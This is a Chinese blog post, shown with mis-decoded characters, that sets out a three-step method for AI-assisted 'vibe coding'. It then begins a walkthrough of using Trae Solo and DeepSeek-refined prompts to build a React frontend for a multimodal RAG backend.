<p>æœ¬ç³»åˆ—å†…å®¹é€‚åˆæ‰€æœ‰å¯¹ LangChain æ„Ÿå…´è¶£çš„å­¦ä¹ è€…ï¼Œæ— è®ºä¹‹å‰æ˜¯å¦æ¥è§¦è¿‡ LangChainã€‚å½“ç„¶ï¼Œå¦‚æœå¤§å®¶å·²ç»å­¦ä¹ è¿‡æˆ‘çš„ä¸“æ <a href="https://juejin.cn/column/7526240014499495972" target="_blank" title="https://juejin.cn/column/7526240014499495972">ã€Šæ·±å…¥æµ…å‡ºLangChain&amp;LangGraph AI Agent æ™ºèƒ½ä½“å¼€å‘ã€‹</a>ï¼Œç›¸ä¿¡å¯ä»¥æ›´å¿«ä¸Šæ‰‹ã€‚è¯¥ä¸“æ åŸºäºç¬”è€…åœ¨å®é™…é¡¹ç›®ä¸­çš„æ·±åº¦ä½¿ç”¨ç»éªŒï¼Œç³»ç»Ÿè®²è§£äº†ä½¿ç”¨LangChain/LangGraphå¦‚ä½•å¼€å‘æ™ºèƒ½ä½“ï¼Œç›®å‰å·²æ›´æ–° 30è®²ï¼Œå¹¶æŒç»­è¡¥å……å®æˆ˜ä¸æ‹“å±•å†…å®¹ã€‚æ¬¢è¿æ„Ÿå…´è¶£çš„åŒå­¦å…³æ³¨ç¬”è€…çš„æ˜é‡‘è´¦å·ä¸ä¸“æ ï¼Œä¹Ÿå¯å…³æ³¨ç¬”è€…çš„åŒåå¾®ä¿¡å…¬ä¼—å·Â <strong>å¤§æ¨¡å‹çœŸå¥½ç©</strong>ï¼Œæ¯æœŸåˆ†äº«æ¶‰åŠçš„ä»£ç å‡å¯åœ¨å…¬ä¼—å·ç§ä¿¡:Â <strong>LangChainæ™ºèƒ½ä½“å¼€å‘</strong>å…è´¹è·å–ã€‚</p>
<h2 data-id="heading-1">ä¸€ã€Vibe Coding æœ€ä½³å®è·µæŒ‡å—</h2>
<p>ç¬”è€…åœ¨æ–‡ç«  <a href="https://juejin.cn/post/7578700798744903714" target="_blank" title="https://juejin.cn/post/7578700798744903714">Chatboxæ”¯æŒæ¥å…¥LangGraphæ™ºèƒ½ä½“ï¼Ÿä¸€åˆ‡éƒ½é Trae Solo!</a>åˆ©ç”¨ Trae Solo å¿«é€Ÿç”Ÿæˆäº†ä¸€ä¸ª FastAPI ä¸­é—´å±‚ï¼Œå°†ç¬”è€…å¼€å‘çš„æ™ºèƒ½ä½“ä¸Chatboxå‰ç«¯é¡µé¢æ— ç¼è¡”æ¥ã€‚å¯¹äºè¿™ç±»éœ€æ±‚æ˜ç¡®ã€ç»“æ„ç®€å•çš„ä»»åŠ¡ï¼ŒTrae Solo ç¡®å®èƒ½åšåˆ°è¿‘ä¹â€œä¸€é”®ç”Ÿæˆâ€ã€‚</p>
<p>ç„¶è€Œå½“é¢å¯¹ä¸€ä¸ªç¨å…·è§„æ¨¡ã€åŠŸèƒ½å¤æ‚çš„ç³»ç»Ÿçº§é¡¹ç›®æ—¶ï¼Œé€šè¿‡å¤šæ¬¡å®è·µï¼Œç¬”è€…å‘ç°ä¸èƒ½æœŸæœ› <strong>Trae Solo</strong> èƒ½ç¬é—´â€œç†è§£â€å…¨éƒ¨éœ€æ±‚ï¼Œä¸€æ¬¡æ€§ç”Ÿæˆå®Œç¾æ— ç‘•çš„ä»£ç ã€‚è¿™æ­£æ˜¯å½“å‰é˜¶æ®µ <strong>Vibe Coding</strong>ï¼ˆæ°›å›´ç¼–ç¨‹ï¼‰çš„çœŸå®å†™ç…§ï¼šå®ƒå¹¶éâ€œæ›¿ä»£â€å¼€å‘è€…ï¼Œè€Œæ˜¯ä¸€ä¸ªéœ€è¦è¢«â€œå¼•å¯¼â€å’Œâ€œååŒâ€çš„å¼ºå¤§å·¥å…·ã€‚</p>
<p>é«˜æ•ˆçš„ <strong>Vibe Coding</strong> ä¸ä»…è¦æ±‚å¼€å‘è€…å…·å¤‡æ‰å®çš„ä¸“ä¸šçŸ¥è¯†å’Œé¡¹ç›®ç»éªŒï¼Œä»¥ä¾¿æå‡ºç²¾å‡†éœ€æ±‚å’Œå®šä½é—®é¢˜ï¼Œæ›´éœ€è¦ä¸€å¥—ç³»ç»Ÿçš„æ–¹æ³•è®ºæ¥å¼•å¯¼ å¤§æ¨¡å‹ã€‚ç»è¿‡åå¤å®è·µä¸æ€»ç»“ï¼Œç¬”è€…åˆ†äº«è‡ªå·±å¸¸ç”¨çš„â€œä¸‰æ­¥èµ°â€æœ€ä½³æŒ‡å—ï¼Œæ˜¾è‘—æå‡å¤§æ¨¡å‹ç”Ÿæˆä»£ç çš„å‡†ç¡®æ€§ä¸å¯ç”¨æ€§ã€‚</p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/15a963556e90493f925a2ee3dbdb53e2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=KQ8ON%2BJWWQ3NDi%2FsNsq8MXEdkpY%3D" alt="3.png" width="70%" loading="lazy"/></p>
<h3 data-id="heading-2">ç¬¬ä¸€æ­¥ï¼šæ„å»ºç»“æ„åŒ–çš„æç¤ºè¯</h3>
<p>æ¸…æ™°ã€å®Œæ•´çš„æç¤ºè¯æ˜¯æˆåŠŸçš„å…³é”®å› ç´ ã€‚ä¸ºäº†è®©å¤§æ¨¡å‹å……åˆ†ç†è§£ä½ çš„æ„å›¾ï¼Œå¿…é¡»æä¾›ä¸€ä»½ç»“æ„ä¸¥è°¨çš„æç¤ºè¯ã€‚åœ¨æ–‡ç« ã€Š<a href="https://juejin.cn/post/7478144526442627091" target="_blank" title="https://juejin.cn/post/7478144526442627091">ä¸å¤§æ¨¡å‹å¯¹è¯çš„è‰ºæœ¯ï¼šæç¤ºè¯å·¥ç¨‹æŒ‡å—ï¼ˆä¸€ï¼‰</a>ã€‹ä¸­ç¬”è€…åˆ†äº«äº†é€šç”¨åœºæ™¯çš„æç¤ºè¯æŠ€å·§ã€‚å¯¹äºå…·ä½“çš„å¼€å‘ä»»åŠ¡ï¼Œç¬”è€…è¿›ä¸€æ­¥å°†å…¶ç»†åŒ–ä¸ºä»¥ä¸‹å‡ ä¸ªæ ¸å¿ƒè¦ç´ ï¼š</p>
<ol>
<li><strong>è§’è‰²å®šä½</strong><br/>
é¦–å…ˆï¼Œæ˜ç¡®èµ‹äºˆå¤§æ¨¡å‹ä¸€ä¸ªç‰¹å®šçš„â€œèº«ä»½â€å’Œâ€œèƒ½åŠ›é›†â€ã€‚ä¾‹å¦‚ï¼šâ€œä½ æ˜¯ä¸€ä½èµ„æ·±çš„å‰ç«¯å¼€å‘å·¥ç¨‹å¸ˆï¼Œç²¾é€š HTMLã€CSSã€JavaScript åŠ React æ¡†æ¶ï¼Œèƒ½å¤Ÿæ ¹æ®äº§å“éœ€æ±‚ç‹¬ç«‹å®Œæˆé«˜è´¨é‡çš„å‰ç«¯é¡µé¢å¼€å‘ã€‚â€</li>
<li><strong>æ¸…æ™°çš„éœ€æ±‚æè¿°</strong><br/>
åœ¨é˜æ˜èƒ½åŠ›åï¼Œå…·ä½“ã€æ— æ­§ä¹‰åœ°æè¿°éœ€æ±‚ã€‚ä¾‹å¦‚ï¼šâ€œè¯·åŸºäºæˆ‘å·²å¼€å‘çš„åç«¯ APIï¼ˆé™„ä¸Šæ¥å£æ–‡æ¡£ï¼‰ï¼Œæ„å»ºä¸€ä¸ªå¤šæ¨¡æ€ RAG ç³»ç»Ÿçš„ç®¡ç†å‰ç«¯ã€‚æ ¸å¿ƒåŠŸèƒ½éœ€åŒ…æ‹¬ï¼šæ–‡æ¡£ä¸Šä¼ åŒºã€å¯¹è¯å†å²åˆ—è¡¨ã€å®æ—¶é—®ç­”äº¤äº’ç•Œé¢ï¼Œå¹¶ç¡®ä¿é—®ç­”ç»“æœèƒ½é«˜äº®æ˜¾ç¤ºå¼•ç”¨çš„åŸæ–‡ç‰‡æ®µã€‚â€</li>
<li><strong>æ˜ç¡®çš„ä»»åŠ¡ç›®æ ‡</strong><br/>
å°†éœ€æ±‚è½¬åŒ–ä¸ºå¯æ‰§è¡Œçš„å…·ä½“ä»»åŠ¡ã€‚ä¾‹å¦‚ï¼šâ€œè¯·ä½¿ç”¨ Vite è„šæ‰‹æ¶åˆ›å»º React é¡¹ç›®ï¼Œé‡‡ç”¨ Ant Design ä½œä¸º UI ç»„ä»¶åº“ï¼Œæ„å»ºç¬¦åˆä¸Šè¿°éœ€æ±‚çš„å‰ç«¯å•é¡µåº”ç”¨ã€‚è¯·ä¿æŒåç«¯ API è°ƒç”¨æ–¹å¼ä¸å˜ï¼Œä¸»è¦é€»è¾‘é›†ä¸­åœ¨Â <code>src/pages/chat</code>Â ç›®å½•ä¸‹ã€‚â€</li>
<li><strong>ä»£ç é£æ ¼ä¸è§„èŒƒçº¦æŸ</strong><br/>
ä¸ºé˜²æ­¢å¤§æ¨¡å‹â€œè‡ªç”±å‘æŒ¥â€å¯¼è‡´ä»£ç é£æ ¼æ··ä¹±ï¼Œå¿…é¡»æå‰çº¦å®šè§„èŒƒã€‚ä¾‹å¦‚ï¼šâ€œè¯·éµå¾ªå‡½æ•°å¼ç»„ä»¶ç¼–å†™ï¼Œä½¿ç”¨ TypeScript è¿›è¡Œç±»å‹å®šä¹‰ã€‚ç›®å½•ç»“æ„éœ€æŒ‰åŠŸèƒ½æ¨¡å—åˆ’åˆ†ï¼Œç»„ä»¶æ–‡ä»¶é‡‡ç”¨ PascalCase å‘½åï¼Œå·¥å…·å‡½æ•°é‡‡ç”¨ camelCase å‘½åã€‚â€</li>
</ol>
<h3 data-id="heading-3">ç¬¬äºŒæ­¥ æç¤ºè¯ä¼˜åŒ–</h3>
<p>ç¬¬ä¸€æ­¥ç¼–å†™çš„æç¤ºè¯ï¼Œå…¶é¦–è¦ç›®æ ‡æ˜¯ä¿è¯â€œäººç±»è§†è§’â€ä¸‹çš„å®Œæ•´æ€§ã€‚ç„¶è€Œï¼Œè¦è®©å¤§æ¨¡å‹æœ€æœ‰æ•ˆåœ°ç†è§£ï¼Œæœ€å¥½ä½¿ç”¨æ›´ç¬¦åˆ AIâ€œæ€ç»´ä¹ æƒ¯â€çš„è¯­è¨€è¿›è¡ŒäºŒæ¬¡ç¼–å†™ã€‚</p>
<p>ä¸€ä¸ªéå¸¸å®ç”¨çš„æŠ€å·§æ˜¯ï¼š<strong>ä¸è¦ç›´æ¥å°†ä½ çš„â€œå¤§ç™½è¯â€æç¤ºè¯ä¸¢ç»™ç›®æ ‡å¤§æ¨¡å‹æˆ–æ™ºèƒ½ä½“ï¼ˆå¦‚ Trae Soloï¼‰ï¼Œè€Œæ˜¯å…ˆè¯·å¦ä¸€ä¸ªæ“…é•¿æ–‡æœ¬å¤„ç†çš„å¤§æ¨¡å‹ï¼ˆå¦‚ DeepSeekï¼‰å¯¹å…¶è¿›è¡Œä¼˜åŒ–ã€‚</strong> Â ä¼˜åŒ–çš„ç›®æ ‡æ˜¯ä½¿è¯­è¨€æ›´æ¡ç†æ¸…æ™°ã€é€»è¾‘é€šé¡ºã€æŒ‡ä»¤æ˜ç¡®ã€‚</p>
<p>äº²æµ‹è¡¨æ˜ï¼Œç»è¿‡è¿™å±‚â€œç¿»è¯‘â€æˆ–â€œæ¶¦è‰²â€åï¼Œå†æäº¤ç»™ Trae Solo ç­‰ä»£ç ç”Ÿæˆå·¥å…·ï¼Œå¾—åˆ°çš„ä»£ç è´¨é‡æ›´é«˜ï¼Œåˆæ¬¡è¿è¡Œçš„é€šè¿‡ç‡æ˜¾è‘—æå‡ï¼Œåç»­éœ€è¦ä¿®æ­£çš„ Bug ä¹Ÿæ›´å°‘ã€‚</p>
<h3 data-id="heading-4">ç¬¬ä¸‰æ­¥ ç²¾å‡†çš„é—®é¢˜å®šä½</h3>
<p>å¯¹äºå¤æ‚é¡¹ç›®ï¼Œå¤§æ¨¡å‹ç”Ÿæˆçš„ä»£ç å‡ ä¹ä¸å¯èƒ½ä¸€æ¬¡æ€§å®Œç¾è¿è¡Œã€‚å½“å‡ºç°Bugæ—¶ï¼Œç¬”è€…èº«è¾¹è®¸å¤šå¼€å‘è€…ä¹ æƒ¯äºç›´æ¥å°†æ•´æ®µæŠ¥é”™ä¿¡æ¯æŠ›ç»™å¤§æ¨¡å‹ï¼Œè¿™ç§æ¨¡ç³Šçš„æé—®æ–¹å¼å¾€å¾€æ”¶æ•ˆç”šå¾®ã€‚</p>
<p>æ›´é«˜æ•ˆçš„åšæ³•æ˜¯ï¼š<strong>å¼€å‘è€…å…ˆè¿›è¡Œåˆæ­¥çš„ã€ç²—ç²’åº¦çš„é—®é¢˜å®šä½ï¼Œå†å¼•å¯¼å¤§æ¨¡å‹è¿›è¡Œç²¾å‡†ä¿®å¤ã€‚</strong> Â å…·ä½“æµç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li><strong>äººå·¥åˆ†æ</strong>ï¼šæ ¹æ®æŠ¥é”™æ ˆä¿¡æ¯ï¼Œåˆæ­¥åˆ¤æ–­é—®é¢˜å¯èƒ½å‡ºç°çš„æ–‡ä»¶æˆ–ä»£ç æ¨¡å—ï¼ˆä¾‹å¦‚ï¼Œå¯èƒ½æ˜¯Â <code>src/components/ChatWindow.tsx</code>Â ä¸­çš„çŠ¶æ€æ›´æ–°é€»è¾‘æœ‰é—®é¢˜ï¼‰ã€‚</li>
<li><strong>æä¾›ä¸Šä¸‹æ–‡</strong>ï¼šå‘å¤§æ¨¡å‹æé—®æ—¶ï¼Œä¸ä»…è¦æä¾›é”™è¯¯ä¿¡æ¯ï¼Œæ›´è¦æä¾›ç›¸å…³æ–‡ä»¶çš„å®Œæ•´ä»£ç æˆ–å…³é”®ç‰‡æ®µä½œä¸ºä¸Šä¸‹æ–‡ã€‚</li>
<li><strong>ç²¾å‡†æé—®</strong>ï¼šæé—®æ–¹å¼åº”ä¸ºï¼šâ€œæˆ‘åœ¨è¿è¡Œé¡¹ç›®æ—¶é‡åˆ°äº†Â <code>[å…·ä½“é”™è¯¯]</code>ã€‚åˆæ­¥åˆ†æé—®é¢˜å¯èƒ½å‡ºåœ¨Â <code>ChatWindow.tsx</code>Â ç»„ä»¶ã€‚ä»¥ä¸‹æ˜¯è¯¥æ–‡ä»¶çš„å®Œæ•´ä»£ç åŠç›¸å…³ä¾èµ–æ¨¡å—çš„ä»£ç ï¼Œè¯·å¸®æˆ‘åˆ†æå¹¶ä¿®å¤è¿™ä¸ªé”™è¯¯ã€‚â€</li>
</ol>
<p>é€šè¿‡è¿™ç§æ–¹å¼ï¼Œä½ å°†ä»ä¸€ä¸ªè¢«åŠ¨çš„â€œé”™è¯¯æäº¤è€…â€è½¬å˜ä¸ºä¸»åŠ¨çš„â€œè°ƒè¯•å¼•å¯¼è€…â€ï¼Œæå¤§æå‡äº†å¤§æ¨¡å‹æ’æŸ¥å’Œä¿®å¤é—®é¢˜çš„æ•ˆç‡ã€‚</p>
<p>ç†è®ºé˜è¿°å†å¤šï¼Œä¸å¦‚åŠ¨æ‰‹å®è·µã€‚æ¥ä¸‹æ¥ï¼Œç¬”è€…å°†å®Œæ•´æ¼”ç¤ºå¦‚ä½•è¿ç”¨ä»¥ä¸Šâ€œä¸‰æ­¥æ³•â€ï¼Œé€šè¿‡ <strong>Trae Solo</strong> ä¸ºå¤šæ¨¡æ€ RAG åç«¯ï¼Œå¼€å‘ä¸€ä¸ªåŠŸèƒ½å®Œå¤‡ã€ç•Œé¢ç¾è§‚çš„å‰ç«¯åº”ç”¨ã€‚</p>
<h2 data-id="heading-5">äºŒã€Trae Solo å‰ç«¯å¼€å‘å®è·µ</h2>
<p>å®è·µæ˜¯æ£€éªŒçœŸç†çš„å”¯ä¸€æ ‡å‡†ã€‚ä¸‹é¢ç¬”è€…å°†ä¸¥æ ¼éµå¾ªå‰æ–‡æ‰€è¿°çš„â€œä¸‰æ­¥èµ°â€æŒ‡å—ï¼Œå¸¦é¢† Trae Solo ä¸€æ­¥æ­¥æ„å»ºå¤šæ¨¡æ€ RAG ç³»ç»Ÿçš„å‰ç«¯ã€‚</p>
<p>é¦–å…ˆåœ¨åŒ…å«åç«¯ä»£ç çš„é¡¹ç›®æ–‡ä»¶å¤¹ä¸­æ‰“å¼€Traeï¼Œè¿™æ ·åœ¨å‘Traeè¿›è¡Œæé—®æ—¶Traeå°±ä¼šè‡ªåŠ¨åˆ†æä¸Šä¸‹æ–‡åç«¯ä»£ç ä¸­çš„å†…å®¹ï¼Œæ›´ç²¾ç¡®çš„ä¾æ®åç«¯æ¥å£ç”Ÿæˆå‰ç«¯é¡µé¢ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/229d61ff29ff455ebc61980ab8adbba7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=ekNUIpUkS9yMhXi38zoCl5OYJG0%3D" alt="5.png" loading="lazy"/></p>
<h3 data-id="heading-6">2.1 ç¼–å†™ç»“æ„åŒ–æç¤ºè¯</h3>
<p>ä¾æ®æŒ‡å—ç¬¬ä¸€æ­¥ï¼Œé¦–å…ˆéœ€è¦æ„å»ºä¸€ä»½ç»“æ„æ¸…æ™°ã€è¦ç´ å®Œæ•´çš„åŸå§‹æç¤ºè¯ã€‚</p>
<ol>
<li><strong>è§’è‰²å®šä½ï¼š</strong> æ˜ç¡®èµ‹äºˆ <strong>Trae Solo</strong> ä¸€ä¸ªä¸“ä¸šèº«ä»½å’Œèƒ½åŠ›èŒƒå›´</li>
</ol>
<pre><code class="hljs language-text" lang="text">ä½ æ˜¯ä¸€åå‰ç«¯ç¼–ç¨‹å¤§å¸ˆï¼Œ
å…·å¤‡ç†Ÿç»ƒè¿ç”¨React+TypeScriptç»„ä»¶åŒ–å¼€å‘çš„æŠ€èƒ½ï¼Œ
ç†Ÿç»ƒè¿ç”¨TailWind CSS + antdæ„å»ºç°ä»£åŒ–æ¡†æ¶æ ·å¼ä¸ç»„ä»¶åº“çš„æŠ€èƒ½ï¼Œ
å…·å¤‡ä½¿ç”¨viteè„šæ‰‹æ¶å¼€å‘å‰ç«¯é¡¹ç›®çš„æŠ€èƒ½ï¼Œ
èƒ½å¤Ÿå®Œæˆç”¨æˆ·æå‡ºçš„æ‰€æœ‰éœ€æ±‚ã€‚
</code></pre>
<ol start="2">
<li><strong>æ¸…æ™°çš„éœ€æ±‚ï¼š</strong> è¯¦ç»†æè¿°ä¸šåŠ¡åœºæ™¯ä¸åŠŸèƒ½ç‚¹</li>
</ol>
<pre><code class="hljs language-text" lang="text">åœ¨backend/srcæ–‡ä»¶å¤¹ä¸‹æ˜¯æˆ‘åˆ©ç”¨fastapiç¼–å†™çš„åç«¯ä»£ç ï¼Œç”¨æˆ·å¯ä»¥è¯·æ±‚æ¥å£å®Œæˆå¤§æ¨¡å‹æ™ºèƒ½é—®ç­”ã€å¤§æ¨¡å‹å›¾ç‰‡åˆ†æã€å¤§æ¨¡å‹éŸ³é¢‘è½¬å†™ã€å¤§æ¨¡å‹PDFé—®ç­”è§£æå››ä¸ªåŠŸèƒ½ã€‚
è¯¥å‰ç«¯é¡¹ç›®åç§°ä¸ºå¤šæ¨¡æ€å¤§æ¨¡å‹RAGç³»ç»Ÿï¼Œç”¨æˆ·è¿›å…¥åé¦–å…ˆä¼šæœ‰ä¸€ä¸ªæ’åˆ—æ™ºèƒ½é—®ç­”ã€å›¾ç‰‡åˆ†æã€éŸ³é¢‘è½¬å†™å’ŒPDFè§£æçš„å››ä¸ªåŠŸèƒ½é€‰é¡¹ï¼Œé€‰æ‹©åŠŸèƒ½é€‰é¡¹ä¼šè¿›å…¥ä¸å¤§æ¨¡å‹çš„å¯¹è¯æ¡†ã€‚
åœ¨æ™ºèƒ½é—®ç­”é€‰é¡¹ä¸­ç”¨æˆ·å¯ä»¥ä¸å¤§æ¨¡å‹è¿›è¡Œå¯¹è¯é—®ç­”ã€‚
åœ¨å›¾ç‰‡åˆ†æé€‰é¡¹ä¸­ç”¨æˆ·é™¤äº†å¯ä»¥ä¸å¤§æ¨¡å‹è¿›è¡Œå¯¹è¯é—®ç­”å¤–ï¼Œè¿˜å¯ä»¥ä¸Šä¼ å›¾ç‰‡ï¼Œå¤§æ¨¡å‹ä¾æ®å›¾ç‰‡å†…å®¹å’Œç”¨æˆ·æé—®è¿›è¡Œå›ç­”ã€‚
åœ¨éŸ³é¢‘è½¬å†™é€‰é¡¹ä¸­ç”¨æˆ·é™¤äº†å¯ä»¥ä¸å¤§æ¨¡å‹è¿›è¡Œå¯¹è¯é—®ç­”å¤–ï¼Œè¿˜å¯ä»¥ä¸Šä¼ éŸ³é¢‘ï¼Œå¤§æ¨¡å‹ä¾æ®éŸ³é¢‘å†…å®¹å’Œç”¨æˆ·æé—®è¿›è¡Œå›ç­”ã€‚
åœ¨PDFè½¬å†™é€‰é¡¹ä¸­ç”¨æˆ·é™¤äº†å¯ä»¥ä¸å¤§æ¨¡å‹è¿›è¡Œå¯¹è¯é—®ç­”å¤–ï¼Œè¿˜å¯ä»¥ä¸Šä¼ PDFï¼Œå¤§æ¨¡å‹ä¾æ®PDFå†…å®¹ä½œä¸ºå‚ç…§å¯¹ç”¨æˆ·æé—®è¿›è¡Œå›ç­”ï¼Œå›ç­”ä¸­è¿˜åŒ…å«å¯¹PDFçš„å¼•ç”¨ã€‚ä¸å¤§æ¨¡å‹çš„å¯¹è¯éƒ½ä»¥æµå¼è¾“å‡ºçš„æ–¹å¼è¾“å‡ºã€‚
</code></pre>
<ol start="3">
<li><strong>æ˜ç¡®çš„ä»»åŠ¡</strong>ï¼šå°†éœ€æ±‚è½¬åŒ–ä¸ºå…·ä½“çš„å¼€å‘æŒ‡ä»¤</li>
</ol>

<pre><code class="hljs language-swift" lang="swift">è¯·åœ¨ä¿æŒæˆ‘åç«¯æ ¸å¿ƒä»£ç ä¸å‘ç”Ÿå¤§è§„æ¨¡å˜åŠ¨çš„å‰æä¸‹ï¼Œ
ä½¿ç”¨viteè„šæ‰‹æ¶ï¼Œåˆ©ç”¨reactæ¡†æ¶ï¼Œantd <span class="hljs-type">UIåº“</span>
å¸®æˆ‘æ„å»ºä¸€ä¸ªå‰ç«¯é¡¹ç›®ç”¨æˆ·è¯·æ±‚æˆ‘çš„åç«¯æ¥å£<span class="hljs-operator">ã€‚</span>
</code></pre>
<p>4.  <strong>ä»£ç è§„èŒƒçº¦æŸï¼š</strong> ä¸ºé˜²æ­¢ä»£ç é£æ ¼å¤±æ§ï¼Œå¿…é¡»æå‰çº¦å®šè§„èŒƒ</p>

<pre><code class="hljs language-scss" lang="scss">åœ¨å‰ç«¯ç¼–å†™ä¸­ï¼Œä½ åº”è¯¥éµå¾ªå¦‚ä¸‹è§„èŒƒï¼Œç¡®ä¿å‰ç«¯ä»£ç çš„å¯ç»´æŠ¤æ€§ï¼š
(<span class="hljs-number">1</span>) ç»„ä»¶è®¾è®¡é‡‡ç”¨å®¹å™¨/å±•ç¤ºåˆ†ç¦»é€»è¾‘ä¸è§†å›¾ï¼Œå®¹å™¨ç»„ä»¶ï¼šç®¡ç†æ•°æ®ã€çŠ¶æ€å’Œé€»è¾‘ã€‚å±•ç¤ºç»„ä»¶ï¼šæ¥æ”¶propsæ¸²æŸ“UIï¼Œé€šå¸¸æ— çŠ¶æ€ã€‚ 
(<span class="hljs-number">2</span>) ç›®å½•ç»“æ„æŒ‰ä¸šåŠ¡æˆ–åŠŸèƒ½æ¨¡å—ç»„ç»‡ï¼Œç»„ä»¶ä¸é¡µé¢åˆ†å¼€å­˜æ”¾ï¼Œ<span class="hljs-attribute">src</span>/pages/ å­˜æ”¾é¡µé¢ï¼Œ<span class="hljs-attribute">src</span>/components/ å­˜æ”¾å…¬å…±ç»„ä»¶ï¼Œ<span class="hljs-attribute">src</span>/modules/ å­˜æ”¾ä¸šåŠ¡æ¨¡å—ã€‚
(<span class="hljs-number">3</span>) å¯¼å…¥å¯¼å‡ºä¿æŒå¯¼å…¥å¯¼å‡ºæ¸…æ™°ä¸€è‡´ï¼Œä¼˜å…ˆä½¿ç”¨å…·åå¯¼å‡ºï¼Œå•æ–‡ä»¶å•ç»„ä»¶ï¼šå¯ç”¨é»˜è®¤å¯¼å‡ºã€‚å•æ–‡ä»¶å¤šç»„ä»¶/å·¥å…·ï¼šå¿…é¡»ç”¨å…·åå¯¼å‡ºã€‚å¯¼å…¥é¡ºåºï¼šåº“ -&gt; ç»„ä»¶ -&gt; èµ„æº -&gt; æ ·å¼ã€‚ 
(<span class="hljs-number">4</span>) æ ·å¼ç®¡ç†é¿å…å…¨å±€æ ·å¼æ±¡æŸ“ï¼Œç»„ä»¶æ ·å¼ç‹¬ç«‹ç®¡ç†ã€‚CSS Modules/Styled Componentsï¼šæ¨èã€‚è¦†ç›–Antdæ ·å¼ï¼šé€šè¿‡è‡ªå®šä¹‰ç±»åæˆ–ä½¿ç”¨configProviderå…¨å±€é…ç½®ã€‚
(<span class="hljs-number">5</span>) è·¯ç”±ä¸é¡µé¢ä½¿ç”¨è·¯ç”±å®ç°é¡µé¢çº§ä»£ç åˆ†å‰²ï¼ŒæŒ‰éœ€åŠ è½½ã€‚é…ç½®é¡µé¢è·¯ç”±ï¼š/pages/Home/index<span class="hljs-selector-class">.jsx</span> -&gt; /homeã€‚æ‡’åŠ è½½é¡µé¢ç»„ä»¶ï¼šä½¿ç”¨ React<span class="hljs-selector-class">.lazy</span>() å’Œ Suspense
</code></pre>
<h3 data-id="heading-7">2.2 DeepSeekæç¤ºè¯ä¼˜åŒ–</h3>
<p>åŸå§‹æç¤ºè¯å·²ç»å…·å¤‡äº†æ‰€æœ‰è¦ç´ ï¼Œä½†å…¶è¡¨è¿°åå‘â€œå¤§ç™½è¯â€ï¼Œé€»è¾‘è¿è´¯æ€§æœ‰å¾…åŠ å¼ºã€‚ç°åœ¨ç¬”è€…æ‰§è¡Œç¬¬äºŒæ­¥ï¼šä½¿ç”¨å¦ä¸€ä¸ªå¤§æ¨¡å‹ï¼ˆè¿™é‡Œé€‰ç”¨ DeepSeekï¼‰å¯¹æç¤ºè¯è¿›è¡Œä¼˜åŒ–ï¼Œä½¿å…¶æ›´ç¬¦åˆå¤§æ¨¡å‹çš„â€œé˜…è¯»ä¹ æƒ¯â€ã€‚</p>
<p><strong>åŸå§‹è¾“å…¥æç¤ºè¯:</strong></p>
<pre><code class="hljs language-text" lang="text">æˆ‘æƒ³è¦ä¸ºæˆ‘fastapiçš„åç«¯ç¼–å†™ä¸€ä¸ªå‰ç«¯é¡µé¢ï¼Œè¯·å¯¹æˆ‘çš„æç¤ºè¯è¿›è¡Œä¼˜åŒ–ï¼Œä½¿æç¤ºè¯æ¡ç†æ¸…æ™°ï¼Œé€»è¾‘é€šé¡ºã€‚æˆ‘çš„æç¤ºè¯å¦‚ä¸‹ï¼š
â€œä½ æ˜¯ä¸€åå‰ç«¯ç¼–ç¨‹å¤§å¸ˆï¼Œå…·å¤‡ç†Ÿç»ƒè¿ç”¨React+TypeScriptç»„ä»¶åŒ–å¼€å‘çš„æŠ€èƒ½ï¼Œç†Ÿç»ƒè¿ç”¨TailWind CSS + antdæ„å»ºç°ä»£åŒ–æ¡†æ¶æ ·å¼ä¸ç»„ä»¶åº“çš„æŠ€èƒ½ï¼Œå…·å¤‡ä½¿ç”¨viteè„šæ‰‹æ¶å¼€å‘å‰ç«¯é¡¹ç›®çš„æŠ€èƒ½ï¼Œèƒ½å¤Ÿå®Œæˆç”¨æˆ·æå‡ºçš„æ‰€æœ‰éœ€æ±‚ã€‚ åœ¨backend/srcæ–‡ä»¶å¤¹ä¸‹æ˜¯æˆ‘åˆ©ç”¨fastapiç¼–å†™çš„åç«¯ä»£ç ï¼Œç”¨æˆ·å¯ä»¥è¯·æ±‚æ¥å£å®Œæˆå¤§æ¨¡å‹æ™ºèƒ½é—®ç­”ã€å¤§æ¨¡å‹å›¾ç‰‡åˆ†æã€å¤§æ¨¡å‹éŸ³é¢‘è½¬å†™ã€å¤§æ¨¡å‹PDFé—®ç­”è§£æå››ä¸ªåŠŸèƒ½ã€‚ è¯·åœ¨ä¿æŒæˆ‘åç«¯æ ¸å¿ƒä»£ç ä¸å‘ç”Ÿå¤§è§„æ¨¡å˜åŠ¨çš„å‰æä¸‹ï¼Œä½¿ç”¨viteè„šæ‰‹æ¶ï¼Œåˆ©ç”¨reactæ¡†æ¶ï¼Œantd UIåº“å¸®æˆ‘æ„å»ºä¸€ä¸ªå‰ç«¯é¡¹ç›®ç”¨æˆ·è¯·æ±‚æˆ‘çš„åç«¯æ¥å£ã€‚ 